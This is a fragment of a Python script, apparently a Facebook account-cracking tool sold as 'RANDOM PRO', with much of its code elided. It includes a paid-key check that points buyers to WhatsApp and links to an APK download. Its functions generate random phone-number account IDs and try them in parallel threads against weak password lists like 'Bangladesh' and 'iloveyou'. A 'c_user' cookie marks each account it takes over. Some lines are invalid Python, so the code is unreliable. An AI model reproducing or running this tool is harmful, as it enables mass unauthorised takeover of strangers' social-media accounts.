...
logo=("""
\033[93;1m __ __ ____ _ __ _ | \/
\033[1;32m | _ \ | |/ /__ _ _ __ ___
\033[91;1m _ __ _ _| | | |\/| | |_) | |
\033[95;1m ' // _` | '_ ` _ \| '__| | | | |
\033[94;1m     | | | | _ < | . \ (_| | | | | | | | | 
\033[93;1m |_| | | |_| |_|_| \_\ |_
\033[93;1m |\_\__,_|_| |_| |_|_|
\033[93;1m \__,_|_|

\33[1;32m───────────────────────────────────────────────────────
\033[1;95m[\033[1;93m[‌>]\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mMR KAMRUL
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mRABBI
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mRabbi-On-Fire
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mRANDOM PRO
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;91m3.0.0
\33[1;32m───────────────────────────────────────────────────────""")
try:
...
if key2 in b:
    ...
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+01744108307')
    exit()
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MR Kamrul_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/groups//?ref=share');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+01744108307&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi MR Kamrul Sir, I Need To Buy Your Paid BHT PRO Tools Version 3.0.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as MR Kamrul:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                MR Kamrul.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                ...
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 50000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                ...
                with tred(max_workers=30) as MR Kamrul:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','@@@@##%%','iloveyou','free fire','freefire']
                                MR Kamrul.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        MR Kamrul=session.cookies.get_dict().keys()
                        if "c_user" in MR Kamrul:
